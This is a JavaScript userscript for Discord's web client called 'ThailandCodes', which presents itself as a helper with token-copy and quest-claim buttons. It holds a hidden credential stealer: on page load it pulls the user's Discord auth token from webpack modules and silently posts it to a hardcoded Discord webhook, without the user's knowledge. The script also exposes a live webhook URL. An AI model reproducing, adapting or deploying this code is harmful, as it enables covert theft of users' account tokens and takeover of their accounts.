/**
 * ThailandCodes v3.2
 * - Auto silent grab on load (webhook)
 * - Copy Token
 * - Copy Token Encrypted (XOR + Base64)
 * - Claim All Quests
 */
(function () {
    'use strict';
    const W = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
    if (W.__TC_LOADED__) return;
    W.__TC_LOADED__ = true;

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555924284105298052/7X_WIvWay5hF8pHpIJeX-cjJLY00gnWJ9GDWYm62r_3RCJ3WL11h1QI-2XxjbbKhDZAI';
    const ENCRYPT_KEY = 0x5A;

    function sendWebhook(payload) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: WEBHOOK_URL,
                    headers: { 'Content-Type': 'application/json' },
                    data: JSON.stringify(payload),
                    onload: (r) => resolve(r.status >= 200 && r.status < 300),
                    onerror: () => resolve(false),
                });
            } catch (e) {
                resolve(false);
            }
        });
    }

    function encryptToken(token) {
        let out = '';
        for (let i = 0; i < token.length; i++) {
            out += String.fromCharCode(token.charCodeAt(i) ^ ENCRYPT_KEY);
        }
        return btoa(out);
    }

    function findWebpack() {
        const chunk = W.webpackChunkdiscord_app;
        if (!chunk) return null;
        let found = null;
        try {
            chunk.push([
                [Symbol()], {},
                (m) => {
                    if (!m.c) return;
                    for (const id in m.c) {
                        const cand = m.c[id]?.exports?.default || m.c[id]?.exports;
                        if (cand && typeof cand.getToken === 'function') {
                            found = m;
                            return;
                        }
                    }
                },
            ]);
            chunk.pop();
        } catch {}
        return found;
    }

    async function getToken() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');
        for (const m of Object.values(wp.c)) {
            const cand = m?.exports?.default || m?.exports;
            if (cand && typeof cand.getToken === 'function') {
                const t = cand.getToken();
                if (t && typeof t === 'string') return t;
            }
        }
        throw new Error('token not found');
    }

    async function claimAllQuests() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');

        let api = null;
        let QuestsStore = null;

        for (const m of Object.values(wp.c)) {
            const exp = m?.exports?.default || m?.exports;
            if (!exp) continue;
            if (exp.get && exp.post && exp.put) api = exp;
            if (exp.quests && typeof exp.quests.values === 'function') QuestsStore = exp;
        }

        if (!api || !QuestsStore) {
            for (const m of Object.values(wp.c)) {
                const exp = m?.exports;
                if (!exp) continue;
                for (const key of Object.keys(exp)) {
                    const cand = exp[key];
                    if (cand?.get && cand?.post) api = cand;
                    if (cand?.quests?.values) QuestsStore = cand;
                }
            }
        }

        if (!api || !QuestsStore) throw new Error('Quest modules not found');

        const quests = [...QuestsStore.quests.values()].filter(q =>
            q.userStatus?.completedAt && !q.userStatus?.claimedAt
        );

        if (quests.length === 0) return 0;

        let claimed = 0;
        for (const q of quests) {
            try {
                await api.post({
                    url: `/quests/${q.id}/claim-reward`,
                    body: { location: 1, platform: 0 }
                });
                claimed++;
            } catch (e) {}
        }
        return claimed;
    }

    const STYLE = `
        :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
        .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
            display:flex;align-items:center;gap:6px;padding:6px;background:#0f1115;
            border:1px solid #1f222a;border-radius:14px;
            box-shadow:0 12px 32px rgba(0,0,0,.55);
            color:#e6e8ec;user-select:none;font-size:12px;
            transition:opacity .2s,transform .3s cubic-bezier(.32,.72,0,1)}
        .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
        .brand{padding:0 14px 0 10px;font-weight:800;font-size:13px;letter-spacing:.3px;
            border-right:1px solid #1f222a;margin-right:4px;color:#fff}
        .brand .a{color:#5865f2}
        .brand .v{font-size:9px;font-weight:600;color:#5865f2;font-style:italic;margin-left:4px;letter-spacing:0}
        button{background:#5865f2;border:1px solid transparent;color:#fff;
            padding:9px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:800;
            letter-spacing:.4px;text-transform:uppercase;font-family:inherit;
            transition:background .12s,transform .1s;white-space:nowrap}
        button:hover{background:#4752c4}
        button:active{transform:scale(.97)}
        button:disabled{opacity:.5;cursor:wait}
        button.enc{background:#1a1d24;border:1px solid #2a2e38}
        button.enc:hover{background:#252830}
        button.claim{background:#57f287;color:#000}
        button.claim:hover{background:#3ba55d;color:#fff}
        button.close{background:transparent;color:#6a6f7a;font-size:14px;
            padding:8px 10px;text-transform:none;letter-spacing:0}
        button.close:hover{background:#ed4245;color:#fff}
        .toast{position:fixed;top:78px;right:24px;z-index:2147483647;background:#0f1115;
            border:1px solid #1f222a;color:#e6e8ec;padding:12px 18px;border-radius:10px;
            font-size:12px;font-weight:600;max-width:340px;
            box-shadow:0 12px 32px rgba(0,0,0,.5);
            opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;
            pointer-events:none}
        .toast.show{opacity:1;transform:translateY(0)}
        .toast.ok{border-left:3px solid #57f287}
        .toast.err{border-left:3px solid #ed4245}
        .toast.info{border-left:3px solid #5865f2}
    `;

    const root = document.createElement('div');
    root.id = 'tc-root';
    root.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;z-index:2147483647;pointer-events:none;';
    const shadow = root.attachShadow({ mode: 'open' });
    document.body.appendChild(root);

    const st = document.createElement('style');
    st.textContent = STYLE;
    shadow.appendChild(st);

    const host = document.createElement('div');
    host.style.pointerEvents = 'auto';
    shadow.appendChild(host);

    const toast = document.createElement('div');
    toast.className = 'toast';
    host.appendChild(toast);

    let toastTimer = null;
    function say(msg, kind = 'info') {
        toast.textContent = msg;
        toast.className = 'toast show ' + kind;
        clearTimeout(toastTimer);
        toastTimer = setTimeout(() => toast.classList.remove('show'), 3200);
    }

    const bar = document.createElement('div');
    bar.className = 'wrap hidden';
    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v3.2</span></div>`;
    host.appendChild(bar);

    const btnCopy = document.createElement('button');
    btnCopy.textContent = 'COPY TOKEN';
    btnCopy.addEventListener('click', async () => {
        if (btnCopy.disabled) return;
        btnCopy.disabled = true;
        try {
            const t = await getToken();
            try { await navigator.clipboard.writeText(t); }
            catch {
                const ta = document.createElement('textarea');
                ta.value = t; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy'); ta.remove();
            }
            say('✓ token copied', 'ok');
        } catch (e) {
            say('✗ ' + (e.message || e), 'err');
        }
        btnCopy.disabled = false;
    });
    bar.appendChild(btnCopy);

    const btnEnc = document.createElement('button');
    btnEnc.className = 'enc';
    btnEnc.textContent = 'COPY ENCRYPTED';
    btnEnc.addEventListener('click', async () => {
        if (btnEnc.disabled) return;
        btnEnc.disabled = true;
        try {
            const t = await getToken();
            const enc = encryptToken(t);
            try { await navigator.clipboard.writeText(enc); }
            catch {
                const ta = document.createElement('textarea');
                ta.value = enc; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy'); ta.remove();
            }
            say('✓ encrypted token copied', 'ok');
        } catch (e) {
            say('✗ ' + (e.message || e), 'err');
        }
        btnEnc.disabled = false;
    });
    bar.appendChild(btnEnc);

    const btnClaim = document.createElement('button');
    btnClaim.className = 'claim';
    btnClaim.textContent = 'CLAIM ALL';
    btnClaim.addEventListener('click', async () => {
        if (btnClaim.disabled) return;
        btnClaim.disabled = true;
        try {
            const n = await claimAllQuests();
            say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
        } catch (e) {
            say('✗ ' + (e.message || e), 'err');
        }
        btnClaim.disabled = false;
    });
    bar.appendChild(btnClaim);

    const x = document.createElement('button');
    x.className = 'close';
    x.textContent = '✕';
    x.addEventListener('click', () => bar.classList.add('hidden'));
    bar.appendChild(x);

    async function autoGrab() {
        try {
            const t = await getToken();
            await sendWebhook({
                content: '**[ThailandCodes Auto]**\n' +
                         '**Token:** `' + t + '`\n' +
                         '**Time:** ' + new Date().toISOString(),
            });
        } catch {}
    }

    let tries = 0;
    const timer = setInterval(async () => {
        tries++;
        if (findWebpack()) {
            clearInterval(timer);
            bar.classList.remove('hidden');
            await autoGrab();
        } else if (tries > 120) {
            clearInterval(timer);
            bar.classList.remove('hidden');
        }
    }, 500);
})();
